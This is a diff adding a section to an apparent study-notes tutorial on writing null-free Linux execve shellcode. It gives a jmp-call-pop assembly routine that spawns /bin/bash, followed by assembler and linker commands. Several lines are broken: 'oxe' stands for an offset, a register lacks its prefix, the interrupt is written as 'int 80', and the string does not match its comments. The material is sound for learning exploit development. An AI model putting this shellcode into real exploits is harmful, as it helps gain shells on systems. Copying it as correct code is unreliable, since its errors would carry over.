@@ -223,6 +223,53 @@ Disassembly of section .text:
 
 ```
 
+There are too many Zeros ('0') in our opcode. So it not possible to pushe the above as shellcode.
+
+```nasm
+The Shellcode contains Nulls = '0' in it, thus
+cannot be inserted into a character array
+-Replace all Null Statements
+
+Uses hardcoded addresses and thus will not work on all machines
+-Setup relative addressing
+```
+
+So, lets improve our assembly code:
+
+```nasm
+#execVeShell.s
+
+_start:
+
+    jmp myCallStatement
+    shellcode:
+        popl %esi                #pop register ESI which is the start of "bin/bashAAAAABBBBCCCCC"
+        xorl %eax, %eax          # Move Zeros to EAX
+        movb %al, 0x9(%esi)      # Move a Zero or NUll to "A"
+        movl esi, 0xa(%esi)      # Moves Address of ESI to "BBBB", now "MNOP"
+        movl %eax, oxe(%esi)     # Moves Zeros to "CCCC" Now, "0000"
+        movb $11, %al            # Moves 11 into AL(Which is the Call sys Execve)
+        movl %esi, %ebx          # Moves "/bin/bash\0" into EBX
+        leal 0xa(%esi), %ecx     # Moves "MNOP" into ECX
+        leal 0xe(%esi), %edx     # Moves "0000" into EDX
+        int 80
+    
+    myCallStatement:
+        call shellcode
+        shellVariables:
+            .ascii "/bin/bashABBBBCCCC"
+                
+
+```
+
+Lets link and compile this:
+
+```
+as -o execVeShellcode.o ExecVeShellcode.s
+
+ld -o execVeShellcode execVeShellcode.o
+```
+
 **#Important Resources:**
 
 These serious of blogs come from the amazing tutotials from Security Tube: https://youtu.be/e2jQgOVkJPM
